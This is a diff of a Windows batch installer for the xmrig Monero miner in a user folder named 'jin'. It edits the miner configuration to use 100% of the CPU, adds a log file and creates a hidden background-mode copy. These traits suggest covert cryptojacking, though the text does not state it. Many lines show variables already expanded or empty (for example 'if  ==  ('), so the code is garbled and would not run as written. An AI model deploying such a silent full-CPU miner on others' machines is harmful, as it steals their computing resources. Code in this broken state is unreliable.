@@ -30,7 +30,7 @@ goto WALLET_LEN_OK
 if  ==  (
 95 goto WALLET_LEN_OK
 )
-echo ERROR: Wrong wallet address length (should be 106 or 95):
+echo ERROR: Wrong wallet address length (should be 106 or 95): 
 exit /b 1
 :WALLET_LEN_OK
 if ["C:\Users\puncher"] == [""] (
@@ -75,43 +75,43 @@ echo ERROR: Can't compute projected Monero hashrate
 exit
 )
 if (4 * 700 / 1000) gtr 8192 (
-set PORT=18192
+ set PORT=18192
 goto PORT_OK )
 if (4 * 700 / 1000) gtr 4096 (
-set PORT=14096
+ set PORT=14096
 goto PORT_OK )
 if (4 * 700 / 1000) gtr 2048 (
-set PORT=12048
+ set PORT=12048
 goto PORT_OK )
 if (4 * 700 / 1000) gtr 1024 (
-set PORT=11024
+ set PORT=11024
 goto PORT_OK )
 if (4 * 700 / 1000) gtr  512 (
-set PORT=10512
+ set PORT=10512
 goto PORT_OK )
 if (4 * 700 / 1000) gtr  256 (
-set PORT=10256
+ set PORT=10256
 goto PORT_OK )
 if (4 * 700 / 1000) gtr  128 (
-set PORT=10128
+ set PORT=10128
 goto PORT_OK )
 if (4 * 700 / 1000) gtr   64 (
-set PORT=10064
+ set PORT=10064
 goto PORT_OK )
 if (4 * 700 / 1000) gtr   32 (
-set PORT=10032
+ set PORT=10032
 goto PORT_OK )
 if (4 * 700 / 1000) gtr   16 (
-set PORT=10016
+ set PORT=10016
 goto PORT_OK )
 if (4 * 700 / 1000) gtr    8 (
-set PORT=10008
+ set PORT=10008
 goto PORT_OK )
 if (4 * 700 / 1000) gtr    4 (
-set PORT=10004
+ set PORT=10004
 goto PORT_OK )
 if (4 * 700 / 1000) gtr    2 (
-set PORT=10002
+ set PORT=10002
 goto PORT_OK )
 set PORT=10001
 :PORT_OK
@@ -232,8 +232,8 @@ powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -repl
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"prx.na\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"prx.na\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
-set LOGFILE2=
-powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
+set LOGFILE2=C:\Users\puncher\jin\xmrig.log
+powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"C:\Users\puncher\jin\xmrig.log\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 copy /Y "C:\Users\puncher\jin\config.json" "C:\Users\puncher\jin\config_background.json" >NUL
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config_background.json'"
 rem preparing script
@@ -306,5 +306,5 @@ set/A "len|=1<<%%A"
 for %%B in ((1<<%%A)) do if ""=="" set/A "len&=~1<<%%A"
 )
 endlocal
-set len%
+set len
 exit /b
